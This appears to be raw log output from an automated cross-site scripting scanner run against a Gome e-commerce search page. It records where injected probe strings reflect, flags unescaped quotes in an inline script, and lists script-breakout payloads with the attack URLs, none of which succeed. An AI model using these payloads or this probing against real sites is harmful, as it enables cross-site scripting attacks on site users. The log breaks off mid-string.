@@ -1,0 +1,464 @@
+https://search.gome.com.cn/search?question=new&searchType=goods&search_mode=normal&reWrite=true&instock=1
+
+GET Params:[5]
+['question', 'searchType', 'search_mode', 'reWrite', 'instock']
+_______________________________________________________________________________________________________
+https://search.gome.com.cn/search?question=abc/uvw"xyz'yxz<zxy&searchType=goods&search_mode=normal&reWrite=true&instock=1
+
+----------------------------------------------------------------------------------
+Attribute Context: [4]
+<meta name="description" content="国美搜索为您提供abc/uvwxyzyxzzxy性价比最高的商品信息,包含了abc/uvwxyzyxzzxy规格,abc/uvwxyzyxzzxy系列等内容,了解更多abc/uvwxyzyxzzxy导购信息,就上国美!正品行货，价格更低,24小时按需配送,为您提供便捷、诚信的服务.">
+<meta name="Keywords" content="abc/uvwxyzyxzzxy性价比,abc/uvwxyzyxzzxy规格,abc/uvwxyzyxzzxy系列,abc/uvwxyzyxzzxy导购">
+<li id="sort-price" class="" data-sort="21" prdUrl1="/search?question=abc%2Fuvwxyzyxzzxy&deliv=0&sort=21&instock=1&market=10&pzpq=0&pzin=v4" prdUrl2="/search?question=abc%2Fuvwxyzyxzzxy&deliv=0&sort=20&instock=1&market=10&pzpq=0&pzin=v4">
+<input type="text" class="search-box-input" id="search-box-input" value="abc/uvwxyzyxzzxy" defaultVal="abc/uvwxyzyxzzxy">
+
+----------------------------------------------------------------------------------
+HTML Context: [2]
+<title>abc/uvwxyzyxzzxy性价比_abc/uvwxyzyxzzxy规格_abc/uvwxyzyxzzxy系列_导购_国美</title>
+<em class="nHeigh">abc/uvwxyzyxzzxy</em>
+
+----------------------------------------------------------------------------------
+Script Context: [4]
+<script>
+    var keyLabelVal = "abc/uvwxyzyxzzxy";
+    keyLabelVal = keyLabelVal.replace(/\"/g,"'");
+    document.getElementById("keyLabel").setAttribute("default",keyLabelVal+",1",1);
+    document.getElementById("keyLabel").innerHTML = keyLabelVal;
+    document.getElementById("keyLabel").style.top = "-50px";
+    document.getElementById("searchInput").value = keyLabelVal;
+</script>
+<script type="text/javascript">
+    var pageData = {
+        ajaxURL     :encodeURI("/search?search_mode=normal&reWrite=true&question=abc/uvwxyzyxzzxy&searchType=goods&instock=1&"),
+        sort        :"00",
+        currentPage :1,
+        totalPage   :1,
+        regionId    :'11010200' || '11010200',
+        regionId_1  :'11010200'.substr(0,2)+"000000" || '11000000',
+        regionId_2  :'11010200'.substr(0,4)+"0000" || '11010000',
+        ajaxStatus  :false,
+        isBW        :false,
+        valueBW     :"0x0",
+        dataBW      :{},
+        searchkey   :"abc/uvwxyzyxzzxy",
+        isSearch    :true,
+        brandId     :"",
+        aCnt        :"0",
+        isShowALL   :false,
+            searchLevel :"2",
+            remain      :"abc",
+    };
+    pageData.cloudSite = "//search.gome.com.cn";
+    pageData.productSite="//item.gome.com.cn";
+    var tagWightVersion = "F";
+    if(pageData.regionId.indexOf("840101")!=-1){
+        pageData.noSkusStock = true;
+    }else{
+        pageData.noSkusStock = false;
+    }
+        pageData.isResult = true;
+        pageData.isfilter = false;
+    pageData.brandFacet = "";
+    /*大数据变量设置*/
+    var dspData = {};
+    dspData.dsp_gome_c1name = "美妆个护";
+    dspData.dsp_gome_c2name = "女性护理";
+    dspData.dsp_gome_c3name = "卫生巾";
+
+    dspData.dsp_gome_c1id = (function(){
+        var el = document.getElementsByClassName('facets-hot-itemfir');
+        if(el.length > 0){
+            var str=[];
+            for(var i = 0,j=el.length;i<j;i++){
+                str.push(el[i].getAttribute("facetsid"))
+            }
+            return str.join(",");
+        }
+        return "";
+    })() || "cat15555607";
+
+    dspData.dsp_gome_c3id = (function(){
+        var el = document.getElementsByClassName('facets-hot-item');
+        if(el.length > 0){
+            var str=[];
+            for(var i = 0,j=el.length;i<j &&i <3;i++){
+                str.push(el[i].getAttribute("facetsid"))
+            }
+            return str.join(",");
+        }
+        return "";
+    })() || "cat18388412";
+
+    dspData.dsp_gome_brid = (function(){
+        var el = document.getElementById("brandChoose");
+        if(el){
+            return el.getAttribute("brandId").substring(1)
+        }
+        return "";
+    })();
+
+    dspData.url={
+        //dsp_url_s:"//ad-flitght.pre.ds.gome.com.cn:8080/flight",//uat
+        dsp_url_s:"//flight.gome.com.cn/flight",//prd
+        //dsp_url_c:"//ad-flitght.pre.ds.gome.com.cn:8080/flight",//uat
+        dsp_url_c:"//flight.gome.com.cn/flight",//prd
+        //flight_url:"//storeConfiguration.flightDomain",
+        flight_url:"//flight.gome.com.cn",
+        bigdata_url:"//bigd.gome.com.cn/gome/rec"
+    };
+
+</script>
+<script type="text/javascript">
+    var loggerData = {
+        "t4":"cat18388412",
+        "t5":"abc/uvwxyzyxzzxy",
+        "t7":"",
+        "t8":"48",
+        "t19":"1",
+        "t20":"0",
+        "t21":"0",
+        "t22_s":"abc/uvwxyzyxzzxy",
+        "t22_r":"abc",
+        "t23":"2",
+        "t31":"F",
+        "t32":"",
+        "t33":"NULL@1vfNGO7OVag*"
+    }
+</script>
+<script>
+    var has_result = true;
+    function getQueryString(name){
+        /*取地址栏*/
+        var reg = new RegExp("(^|&)"+ name +"=([^&]*)(&|$)");
+        var r = window.location.search.substr(1).match(reg);
+        if(r!=null){
+            return  unescape(r[2]);
+        }else{
+            return '';
+        }
+    };
+    var search_type = getQueryString('searchType');
+    var search_mode = getQueryString('search_mode');
+    var search_id = "NULL@1vfNGO7OVag*";
+    var search_query = "abc/uvwxyzyxzzxy";
+    try {
+        GomeSa.track('PageSearchList', {
+            search_id: search_id,
+            search_query: search_query,
+            search_type: search_type,
+            search_mode: search_mode,
+            has_result:has_result
+        });
+    }catch(err) {
+    };
+
+
+//    setTimeout(function(){
+//        var pageCur = $(".page-nav .num em").html();
+//
+//    },2000);
+</script>
+
+----------------------------------------------------------------------------------
+URI Context: [34]
+<a id="clearallfacts" class="nSearch-crumb-clearFacets" data-code="9000001100-0" href="//search.gome.com.cn/search?question=abc/uvwxyzyxzzxy">
+<a id="brandID13qm" data-code="9000000200-0" facetsId="13qm" href="//search.gome.com.cn/search?question=abc%2Fuvwxyzyxzzxy&deliv=0&instock=1&market=10&facets=13qm&pzpq=0&pzin=v4" class="facet" name="ABC" style="background-image:url(//gfs.gomein.net.cn/T1SCATB5Dv1RCvBVdK)">
+<a id="brandID1bEF" data-code="9000000200-1" facetsId="1bEF" href="//search.gome.com.cn/search?question=abc%2Fuvwxyzyxzzxy&deliv=0&instock=1&market=10&facets=1bEF&pzpq=0&pzin=v4" class="facet" name="亿宸贵苏" style="background-image:url(//gfs4.gomein.net.cn/T1zmATB5AT1RCvBVdK)">
+<a id="brandID10dQ" data-code="9000000200-2" facetsId="10dQ" href="//search.gome.com.cn/search?question=abc%2Fuvwxyzyxzzxy&deliv=0&instock=1&market=10&facets=10dQ&pzpq=0&pzin=v4" class="facet" name="南极人" style="background-image:url(//gfs.gomein.net.cn/T1IkCTBvbv1RCvBVdK)">
+<a id="brandID2maJ" data-code="9000000200-3" facetsId="2maJ" href="//search.gome.com.cn/search?question=abc%2Fuvwxyzyxzzxy&deliv=0&instock=1&market=10&facets=2maJ&pzpq=0&pzin=v4" class="facet" name="辛尚" style="text-indent:0">
+<a class="facet " data-code="9000000500-0" href="//search.gome.com.cn/search?question=abc%2Fuvwxyzyxzzxy&deliv=0&instock=1&market=10&facets=16JY&pzpq=0&pzin=v4" facetsId="16JY">
+<a class="facet " data-code="9000000500-1" href="//search.gome.com.cn/search?question=abc%2Fuvwxyzyxzzxy&deliv=0&instock=1&market=10&facets=16JV&pzpq=0&pzin=v4" facetsId="16JV">
+<a class="facet " data-code="9000000500-0" href="//search.gome.com.cn/search?question=abc%2Fuvwxyzyxzzxy&deliv=0&instock=1&market=10&facets=1dHr&pzpq=0&pzin=v4" facetsId="1dHr">
+<a class="facet " data-code="9000000500-1" href="//search.gome.com.cn/search?question=abc%2Fuvwxyzyxzzxy&deliv=0&instock=1&market=10&facets=1dHy&pzpq=0&pzin=v4" facetsId="1dHy">
+<a class="facet " data-code="9000000500-0" href="//search.gome.com.cn/search?question=abc%2Fuvwxyzyxzzxy&deliv=0&instock=1&market=10&facets=16Mp&pzpq=0&pzin=v4" facetsId="16Mp">
+<a class="facet " data-code="9000000500-1" href="//search.gome.com.cn/search?question=abc%2Fuvwxyzyxzzxy&deliv=0&instock=1&market=10&facets=1e3Y&pzpq=0&pzin=v4" facetsId="1e3Y">
+<a class="facet " data-code="9000000500-2" href="//search.gome.com.cn/search?question=abc%2Fuvwxyzyxzzxy&deliv=0&instock=1&market=10&facets=2fF9&pzpq=0&pzin=v4" facetsId="2fF9">
+<a class="facet " data-code="9000000500-0" href="//search.gome.com.cn/search?question=abc%2Fuvwxyzyxzzxy&deliv=0&instock=1&market=10&facets=1dmi&pzpq=0&pzin=v4" facetsId="1dmi">
+<a class="facet " data-code="9000000500-0" href="//search.gome.com.cn/search?question=abc%2Fuvwxyzyxzzxy&deliv=0&instock=1&market=10&facets=2hZl&pzpq=0&pzin=v4" facetsId="2hZl">
+<a class="facet " data-code="9000000500-1" href="//search.gome.com.cn/search?question=abc%2Fuvwxyzyxzzxy&deliv=0&instock=1&market=10&facets=2hZm&pzpq=0&pzin=v4" facetsId="2hZm">
+<a class="facet " data-code="9000000500-2" href="//search.gome.com.cn/search?question=abc%2Fuvwxyzyxzzxy&deliv=0&instock=1&market=10&facets=2hZo&pzpq=0&pzin=v4" facetsId="2hZo">
+<a class="facet " data-code="9000000500-3" href="//search.gome.com.cn/search?question=abc%2Fuvwxyzyxzzxy&deliv=0&instock=1&market=10&facets=2hZq&pzpq=0&pzin=v4" facetsId="2hZq">
+<a class="facet " data-code="9000000500-4" href="//search.gome.com.cn/search?question=abc%2Fuvwxyzyxzzxy&deliv=0&instock=1&market=10&facets=2hZr&pzpq=0&pzin=v4" facetsId="2hZr">
+<a class="facet " data-code="9000000500-5" href="//search.gome.com.cn/search?question=abc%2Fuvwxyzyxzzxy&deliv=0&instock=1&market=10&facets=2hZg&pzpq=0&pzin=v4" facetsId="2hZg">
+<a class="facet " data-code="9000000500-6" href="//search.gome.com.cn/search?question=abc%2Fuvwxyzyxzzxy&deliv=0&instock=1&market=10&facets=16FB&pzpq=0&pzin=v4" facetsId="16FB">
+<a class="facet " data-code="9000000500-0" href="//search.gome.com.cn/search?question=abc%2Fuvwxyzyxzzxy&deliv=0&instock=1&market=10&facets=2hMU&pzpq=0&pzin=v4" facetsId="2hMU">
+<a class="facet " data-code="9000000500-1" href="//search.gome.com.cn/search?question=abc%2Fuvwxyzyxzzxy&deliv=0&instock=1&market=10&facets=2hMV&pzpq=0&pzin=v4" facetsId="2hMV">
+<a class="facet " data-code="9000000500-2" href="//search.gome.com.cn/search?question=abc%2Fuvwxyzyxzzxy&deliv=0&instock=1&market=10&facets=2eH7&pzpq=0&pzin=v4" facetsId="2eH7">
+<a class="facet" data-code="9000002400-0" href="//search.gome.com.cn/search?question=abc%2Fuvwxyzyxzzxy&deliv=0&instock=1&market=10&facets=16RJ&pzpq=0&pzin=v4" facetsId="16RJ">
+<a href="/search?question=abc%2Fuvwxyzyxzzxy&deliv=0&sort=00&instock=1&market=10&pzpq=0&pzin=v4" data-href="/search?question=abc%2Fuvwxyzyxzzxy&deliv=0&sort=00&instock=1&market=10&pzpq=0&pzin=v4">
+<a href="/search?question=abc%2Fuvwxyzyxzzxy&deliv=0&sort=10&instock=1&market=10&pzpq=0&pzin=v4" data-href="/search?question=abc%2Fuvwxyzyxzzxy&deliv=0&sort=10&instock=1&market=10&pzpq=0&pzin=v4">
+<a href="/search?question=abc%2Fuvwxyzyxzzxy&deliv=0&sort=30&instock=1&market=10&pzpq=0&pzin=v4" data-href="/search?question=abc%2Fuvwxyzyxzzxy&deliv=0&sort=30&instock=1&market=10&pzpq=0&pzin=v4">
+<a href="/search?question=abc%2Fuvwxyzyxzzxy&deliv=0&sort=50&instock=1&market=10&pzpq=0&pzin=v4" data-href="/search?question=abc%2Fuvwxyzyxzzxy&deliv=0&sort=50&instock=1&market=10&pzpq=0&pzin=v4">
+<a class="gmform-label  " id="deliv" data-code="9000000600-10" href="//search.gome.com.cn/search?question=abc%2Fuvwxyzyxzzxy&deliv=1&instock=1&market=10&pzpq=0&pzin=v4">
+<a class="gmform-label checke" id="instock" data-code="9000000600-11" data-href="//search.gome.com.cn" href="//search.gome.com.cn/search?question=abc%2Fuvwxyzyxzzxy&deliv=0&market=10&pzpq=0&pzin=v4">
+<a class="gmform-label  " id="discountQiang" data-code="9000000600-13" href="//search.gome.com.cn/search?question=abc%2Fuvwxyzyxzzxy&deliv=0&sale=010&instock=1&market=10&pzpq=0&pzin=v4">
+<a class="gmform-label   hide-dom" id="market" data-code="9000000600-14" href="//search.gome.com.cn/search?question=abc%2Fuvwxyzyxzzxy&deliv=0&instock=1&market=11&pzpq=0&pzin=v4">
+<meta name="description" content="国美搜索为您提供abc/uvwxyzyxzzxy性价比最高的商品信息,包含了abc/uvwxyzyxzzxy规格,abc/uvwxyzyxzzxy系列等内容,了解更多abc/uvwxyzyxzzxy导购信息,就上国美!正品行货，价格更低,24小时按需配送,为您提供便捷、诚信的服务.">
+<meta name="Keywords" content="abc/uvwxyzyxzzxy性价比,abc/uvwxyzyxzzxy规格,abc/uvwxyzyxzzxy系列,abc/uvwxyzyxzzxy导购">
+
+----------------------------------------------------------------------------------
+
+_______________________________________________________________________________________________________
+https://search.gome.com.cn/search?question=new&searchType=abc/uvw"xyz'yxz<zxy&search_mode=normal&reWrite=true&instock=1
+
+----------------------------------------------------------------------------------
+Attribute Context: [0]
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [1]
+<script type="text/javascript">
+    var pageData = {
+        ajaxURL     :encodeURI("/search?search_mode=normal&reWrite=true&question=new&searchType=abc/uvw"xyz'yxzzxy&instock=1&"),
+        sort        :"00",
+        currentPage :1,
+        totalPage   :1,
+        regionId    :'11010200' || '11010200',
+        regionId_1  :'11010200'.substr(0,2)+"000000" || '11000000',
+        regionId_2  :'11010200'.substr(0,4)+"0000" || '11010000',
+        ajaxStatus  :false,
+        isBW        :false,
+        valueBW     :"0x0",
+        dataBW      :{},
+        searchkey   :"new",
+        isSearch    :true,
+        brandId     :"",
+        aCnt        :"0",
+        isShowALL   :false,
+    };
+    pageData.cloudSite = "//search.gome.com.cn";
+    pageData.productSite="//item.gome.com.cn";
+    var tagWightVersion = "F";
+    if(pageData.regionId.indexOf("840101")!=-1){
+        pageData.noSkusStock = true;
+    }else{
+        pageData.noSkusStock = false;
+    }
+        pageData.isResult = true;
+        pageData.isfilter = false;
+    pageData.brandFacet = "";
+    /*大数据变量设置*/
+    var dspData = {};
+    dspData.dsp_gome_c1name = "电脑 办公打印 文仪";
+    dspData.dsp_gome_c2name = "电脑整机";
+    dspData.dsp_gome_c3name = "笔记本";
+
+    dspData.dsp_gome_c1id = (function(){
+        var el = document.getElementsByClassName('facets-hot-itemfir');
+        if(el.length > 0){
+            var str=[];
+            for(var i = 0,j=el.length;i<j;i++){
+                str.push(el[i].getAttribute("facetsid"))
+            }
+            return str.join(",");
+        }
+        return "";
+    })() || "cat10000001";
+
+    dspData.dsp_gome_c3id = (function(){
+        var el = document.getElementsByClassName('facets-hot-item');
+        if(el.length > 0){
+            var str=[];
+            for(var i = 0,j=el.length;i<j &&i <3;i++){
+                str.push(el[i].getAttribute("facetsid"))
+            }
+            return str.join(",");
+        }
+        return "";
+    })() || "cat10000092";
+
+    dspData.dsp_gome_brid = (function(){
+        var el = document.getElementById("brandChoose");
+        if(el){
+            return el.getAttribute("brandId").substring(1)
+        }
+        return "";
+    })();
+
+    dspData.url={
+        //dsp_url_s:"//ad-flitght.pre.ds.gome.com.cn:8080/flight",//uat
+        dsp_url_s:"//flight.gome.com.cn/flight",//prd
+        //dsp_url_c:"//ad-flitght.pre.ds.gome.com.cn:8080/flight",//uat
+        dsp_url_c:"//flight.gome.com.cn/flight",//prd
+        //flight_url:"//storeConfiguration.flightDomain",
+        flight_url:"//flight.gome.com.cn",
+        bigdata_url:"//bigd.gome.com.cn/gome/rec"
+    };
+
+</script>
+
+----------------------------------------------------------------------------------
+URI Context: [0]
+
+----------------------------------------------------------------------------------
+
+
+
+	 There is no mitigation for Double Quotes here 
+b'<script type="text/javascript">\n    var pageData = {\n        ajaxURL     :encodeURI("/search?search_mode=normal&reWrite=true&question=new&searchType=abc/uvw"xyz\'yxzzxy&instock=1&"),\n        sort        :"00",\n        currentPage :1,\n        totalPage   :1,\n        regionId    :\'11010200\' || \'11010200\',\n        regionId_1  :\'11010200\'.substr(0,2)+"000000" || \'11000000\',\n        regionId_2  :\'11010200\'.substr(0,4)+"0000" || \'11010000\',\n        ajaxStatus  :false,\n        isBW        :false,\n        valueBW     :"0x0",\n        dataBW      :{},\n        searchkey   :"new",\n        isSearch    :true,\n        brandId     :"",\n        aCnt        :"0",\n        isShowALL   :false,\n    };\n    pageData.cloudSite = "//search.gome.com.cn";\n    pageData.productSite="//item.gome.com.cn";\n    var tagWightVersion = "F";\n    if(pageData.regionId.indexOf("840101")!=-1){\n        pageData.noSkusStock = true;\n    }else{\n        pageData.noSkusStock = false;\n    }\n        pageData.isResult = true;\n        pageData.isfilter = false;\n    pageData.brandFacet = "";\n    /*\xe5\xa4\xa7\xe6\x95\xb0\xe6\x8d\xae\xe5\x8f\x98\xe9\x87\x8f\xe8\xae\xbe\xe7\xbd\xae*/\n    var dspData = {};\n    dspData.dsp_gome_c1name = "\xe7\x94\xb5\xe8\x84\x91 \xe5\x8a\x9e\xe5\x85\xac\xe6\x89\x93\xe5\x8d\xb0 \xe6\x96\x87\xe4\xbb\xaa";\n    dspData.dsp_gome_c2name = "\xe7\x94\xb5\xe8\x84\x91\xe6\x95\xb4\xe6\x9c\xba";\n    dspData.dsp_gome_c3name = "\xe7\xac\x94\xe8\xae\xb0\xe6\x9c\xac";\n\n    dspData.dsp_gome_c1id = (function(){\n        var el = document.getElementsByClassName(\'facets-hot-itemfir\');\n        if(el.length > 0){\n            var str=[];\n            for(var i = 0,j=el.length;i<j;i++){\n                str.push(el[i].getAttribute("facetsid"))\n            }\n            return str.join(",");\n        }\n        return "";\n    })() || "cat10000001";\n\n    dspData.dsp_gome_c3id = (function(){\n        var el = document.getElementsByClassName(\'facets-hot-item\');\n        if(el.length > 0){\n            var str=[];\n            for(var i = 0,j=el.length;i<j &&i <3;i++){\n                str.push(el[i].getAttribute("facetsid"))\n            }\n            return str.join(",");\n        }\n        return "";\n    })() || "cat10000092";\n\n    dspData.dsp_gome_brid = (function(){\n        var el = document.getElementById("brandChoose");\n        if(el){\n            return el.getAttribute("brandId").substring(1)\n        }\n        return "";\n    })();\n\n    dspData.url={\n        //dsp_url_s:"//ad-flitght.pre.ds.gome.com.cn:8080/flight",//uat\n        dsp_url_s:"//flight.gome.com.cn/flight",//prd\n        //dsp_url_c:"//ad-flitght.pre.ds.gome.com.cn:8080/flight",//uat\n        dsp_url_c:"//flight.gome.com.cn/flight",//prd\n        //flight_url:"//storeConfiguration.flightDomain",\n        flight_url:"//flight.gome.com.cn",\n        bigdata_url:"//bigd.gome.com.cn/gome/rec"\n    };\n\n</script>'
+
+	 There is no mitigation for Single Quotes here 
+b'<script type="text/javascript">\n    var pageData = {\n        ajaxURL     :encodeURI("/search?search_mode=normal&reWrite=true&question=new&searchType=abc/uvw"xyz\'yxzzxy&instock=1&"),\n        sort        :"00",\n        currentPage :1,\n        totalPage   :1,\n        regionId    :\'11010200\' || \'11010200\',\n        regionId_1  :\'11010200\'.substr(0,2)+"000000" || \'11000000\',\n        regionId_2  :\'11010200\'.substr(0,4)+"0000" || \'11010000\',\n        ajaxStatus  :false,\n        isBW        :false,\n        valueBW     :"0x0",\n        dataBW      :{},\n        searchkey   :"new",\n        isSearch    :true,\n        brandId     :"",\n        aCnt        :"0",\n        isShowALL   :false,\n    };\n    pageData.cloudSite = "//search.gome.com.cn";\n    pageData.productSite="//item.gome.com.cn";\n    var tagWightVersion = "F";\n    if(pageData.regionId.indexOf("840101")!=-1){\n        pageData.noSkusStock = true;\n    }else{\n        pageData.noSkusStock = false;\n    }\n        pageData.isResult = true;\n        pageData.isfilter = false;\n    pageData.brandFacet = "";\n    /*\xe5\xa4\xa7\xe6\x95\xb0\xe6\x8d\xae\xe5\x8f\x98\xe9\x87\x8f\xe8\xae\xbe\xe7\xbd\xae*/\n    var dspData = {};\n    dspData.dsp_gome_c1name = "\xe7\x94\xb5\xe8\x84\x91 \xe5\x8a\x9e\xe5\x85\xac\xe6\x89\x93\xe5\x8d\xb0 \xe6\x96\x87\xe4\xbb\xaa";\n    dspData.dsp_gome_c2name = "\xe7\x94\xb5\xe8\x84\x91\xe6\x95\xb4\xe6\x9c\xba";\n    dspData.dsp_gome_c3name = "\xe7\xac\x94\xe8\xae\xb0\xe6\x9c\xac";\n\n    dspData.dsp_gome_c1id = (function(){\n        var el = document.getElementsByClassName(\'facets-hot-itemfir\');\n        if(el.length > 0){\n            var str=[];\n            for(var i = 0,j=el.length;i<j;i++){\n                str.push(el[i].getAttribute("facetsid"))\n            }\n            return str.join(",");\n        }\n        return "";\n    })() || "cat10000001";\n\n    dspData.dsp_gome_c3id = (function(){\n        var el = document.getElementsByClassName(\'facets-hot-item\');\n        if(el.length > 0){\n            var str=[];\n            for(var i = 0,j=el.length;i<j &&i <3;i++){\n                str.push(el[i].getAttribute("facetsid"))\n            }\n            return str.join(",");\n        }\n        return "";\n    })() || "cat10000092";\n\n    dspData.dsp_gome_brid = (function(){\n        var el = document.getElementById("brandChoose");\n        if(el){\n            return el.getAttribute("brandId").substring(1)\n        }\n        return "";\n    })();\n\n    dspData.url={\n        //dsp_url_s:"//ad-flitght.pre.ds.gome.com.cn:8080/flight",//uat\n        dsp_url_s:"//flight.gome.com.cn/flight",//prd\n        //dsp_url_c:"//ad-flitght.pre.ds.gome.com.cn:8080/flight",//uat\n        dsp_url_c:"//flight.gome.com.cn/flight",//prd\n        //flight_url:"//storeConfiguration.flightDomain",\n        flight_url:"//flight.gome.com.cn",\n        bigdata_url:"//bigd.gome.com.cn/gome/rec"\n    };\n\n</script>'
+Attack Payloads for SCRIPT
+['"; confirm`1`; "', "'; confirm`1`; '"]
+
+SCRIPT Attack Url: https://search.gome.com.cn/search?question=new&searchType="; confirm`1`; "&search_mode=normal&reWrite=true&instock=1
+
+ ______Detection  UnSuccessful with payload: "; confirm`1`; "
+
+
+SCRIPT Attack Url: https://search.gome.com.cn/search?question=new&searchType='; confirm`1`; '&search_mode=normal&reWrite=true&instock=1
+
+ ______Detection  UnSuccessful with payload: '; confirm`1`; '
+
+_______________________________________________________________________________________________________
+https://search.gome.com.cn/search?question=new&searchType=goods&search_mode=abc/uvw"xyz'yxz<zxy&reWrite=true&instock=1
+
+----------------------------------------------------------------------------------
+Attribute Context: [0]
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [1]
+<script type="text/javascript">
+    var pageData = {
+        ajaxURL     :encodeURI("/search?search_mode=abc/uvw"xyz'yxzzxy&reWrite=true&question=new&searchType=goods&instock=1&"),
+        sort        :"00",
+        currentPage :1,
+        totalPage   :1,
+        regionId    :'11010200' || '11010200',
+        regionId_1  :'11010200'.substr(0,2)+"000000" || '11000000',
+        regionId_2  :'11010200'.substr(0,4)+"0000" || '11010000',
+        ajaxStatus  :false,
+        isBW        :false,
+        valueBW     :"0x0",
+        dataBW      :{},
+        searchkey   :"new",
+        isSearch    :true,
+        brandId     :"",
+        aCnt        :"0",
+        isShowALL   :false,
+    };
+    pageData.cloudSite = "//search.gome.com.cn";
+    pageData.productSite="//item.gome.com.cn";
+    var tagWightVersion = "F";
+    if(pageData.regionId.indexOf("840101")!=-1){
+        pageData.noSkusStock = true;
+    }else{
+        pageData.noSkusStock = false;
+    }
+        pageData.isResult = true;
+        pageData.isfilter = false;
+    pageData.brandFacet = "";
+    /*大数据变量设置*/
+    var dspData = {};
+    dspData.dsp_gome_c1name = "电脑 办公打印 文仪";
+    dspData.dsp_gome_c2name = "电脑整机";
+    dspData.dsp_gome_c3name = "笔记本";
+
+    dspData.dsp_gome_c1id = (function(){
+        var el = document.getElementsByClassName('facets-hot-itemfir');
+        if(el.length > 0){
+            var str=[];
+            for(var i = 0,j=el.length;i<j;i++){
+                str.push(el[i].getAttribute("facetsid"))
+            }
+            return str.join(",");
+        }
+        return "";
+    })() || "cat10000001";
+
+    dspData.dsp_gome_c3id = (function(){
+        var el = document.getElementsByClassName('facets-hot-item');
+        if(el.length > 0){
+            var str=[];
+            for(var i = 0,j=el.length;i<j &&i <3;i++){
+                str.push(el[i].getAttribute("facetsid"))
+            }
+            return str.join(",");
+        }
+        return "";
+    })() || "cat10000092";
+
+    dspData.dsp_gome_brid = (function(){
+        var el = document.getElementById("brandChoose");
+        if(el){
+            return el.getAttribute("brandId").substring(1)
+        }
+        return "";
+    })();
+
+    dspData.url={
+        //dsp_url_s:"//ad-flitght.pre.ds.gome.com.cn:8080/flight",//uat
+        dsp_url_s:"//flight.gome.com.cn/flight",//prd
+        //dsp_url_c:"//ad-flitght.pre.ds.gome.com.cn:8080/flight",//uat
+        dsp_url_c:"//flight.gome.com.cn/flight",//prd
+        //flight_url:"//storeConfiguration.flightDomain",
+        flight_url:"//flight.gome.com.cn",
+        bigdata_url:"//bigd.gome.com.cn/gome/rec"
+    };
+
+</script>
+
+----------------------------------------------------------------------------------
+URI Context: [0]
+
+----------------------------------------------------------------------------------
+
+
+
+	 There is no mitigation for Double Quotes here 
+b'<script type="text/javascript">\n    var pageData = {\n        ajaxURL     :encodeURI("/search?search_mode=abc/uvw"xyz\'yxzzxy&reWrite=true&question=new&searchType=goods&instock=1&"),\n        sort        :"00",\n        currentPage :1,\n        totalPage   :1,\n        regionId    :\'11010200\' || \'11010200\',\n        regionId_1  :\'11010200\'.substr(0,2)+"000000" || \'11000000\',\n        regionId_2  :\'11010200\'.substr(0,4)+"0000" || \'11010000\',\n        ajaxStatus  :false,\n        isBW        :false,\n        valueBW     :"0x0",\n        dataBW      :{},\n        searchkey   :"new",\n        isSearch    :true,\n        brandId     :"",\n        aCnt        :"0",\n        isShowALL   :false,\n    };\n    pageData.cloudSite = "//search.gome.com.cn";\n    pageData.productSite="//item.gome.com.cn";\n    var tagWightVersion = "F";\n    if(pageData.regionId.indexOf("840101")!=-1){\n        pageData.noSkusStock = true;\n    }else{\n        pageData.noSkusStock = false;\n    }\n        pageData.isResult = true;\n        pageData.isfilter = false;\n    pageData.brandFacet = "";\n    /*\xe5\xa4\xa7\xe6\x95\xb0\xe6\x8d\xae\xe5\x8f\x98\xe9\x87\x8f\xe8\xae\xbe\xe7\xbd\xae*/\n    var dspData = {};\n    dspData.dsp_gome_c1name = "\xe7\x94\xb5\xe8\x84\x91 \xe5\x8a\x9e\xe5\x85\xac\xe6\x89\x93\xe5\x8d\xb0 \xe6\x96\x87\xe4\xbb\xaa";\n    dspData.dsp_gome_c2name = "\xe7\x94\xb5\xe8\x84\x91\xe6\x95\xb4\xe6\x9c\xba";\n    dspData.dsp_gome_c3name = "\xe7\xac\x94\xe8\xae\xb0\xe6\x9c\xac";\n\n    dspData.dsp_gome_c1id = (function(){\n        var el = document.getElementsByClassName(\'facets-hot-itemfir\');\n        if(el.length > 0){\n            var str=[];\n            for(var i = 0,j=el.length;i<j;i++){\n                str.push(el[i].getAttribute("facetsid"))\n            }\n            return str.join(",");\n        }\n        return "";\n    })() || "cat10000001";\n\n    dspData.dsp_gome_c3id = (function(){\n        var el = document.getElementsByClassName(\'facets-hot-item\');\n        if(el.length > 0){\n            var str=[];\n            for(var i = 0,j=el.length;i<j &&i <3;i++){\n                str.push(el[i].getAttribute("facetsid"))\n            }\n            return str.join(",");\n        }\n        return "";\n    })() || "cat10000092";\n\n    dspData.dsp_gome_brid = (function(){\n        var el = document.getElementById("brandChoose");\n        if(el){\n            return el.getAttribute("brandId").substring(1)\n        }\n        return "";\n    })();\n\n    dspData.url={\n        //dsp_url_s:"//ad-flitght.pre.ds.gome.com.cn:8080/flight",//uat\n        dsp_url_s:"//flight.gome.com.cn/flight",//prd\n        //dsp_url_c:"//ad-flitght.pre.ds.gome.com.cn:8080/flight",//uat\n        dsp_url_c:"//flight.gome.com.cn/flight",//prd\n        //flight_url:"//storeConfiguration.flightDomain",\n        flight_url:"//flight.gome.com.cn",\n        bigdata_url:"//bigd.gome.com.cn/gome/rec"\n    };\n\n</script>'
+
+	 There is no mitigation for Single Quotes here 
+b'<script type="text/javascript">\n    var pageData = {\n        ajaxURL     :encodeURI("/search?search_mode=abc/uvw"xyz\'yxzzxy&reWrite=true&question=new&searchType=goods&instock=1&"),\n        sort        :"00",\n        currentPage :1,\n        totalPage   :1,\n        regionId    :\'11010200\' || \'11010200\',\n        regionId_1  :\'11010200\'.substr(0,2)+"000000" || \'11000000\',\n        regionId_2  :\'11010200\'.substr(0,4)+"0000" || \'11010000\',\n        ajaxStatus  :false,\n        isBW        :false,\n        valueBW     :"0x0",\n        dataBW      :{},\n        searchkey   :"new",\n        isSearch    :true,\n        brandId     :"",\n        aCnt        :"0",\n        isShowALL   :false,\n    };\n    pageData.cloudSite = "//search.gome.com.cn";\n    pageData.productSite="//item.gome.com.cn";\n    var tagWightVersion = "F";\n    if(pageData.regionId.indexOf("840101")!=-1){\n        pageData.noSkusStock = true;\n    }else{\n        pageData.noSkusStock = false;\n    }\n        pageData.isResult = true;\n        pageData.isfilter = false;\n    pageData.brandFacet = "";\n    /*\xe5\xa4\xa7\xe6\x95\xb0\xe6\x8d\xae\xe5\x8f\x98\xe9\x87\x8f\xe8\xae\xbe\xe7\xbd\xae*/\n    var dspData = {};\n    dspData.dsp_gome_c1name = 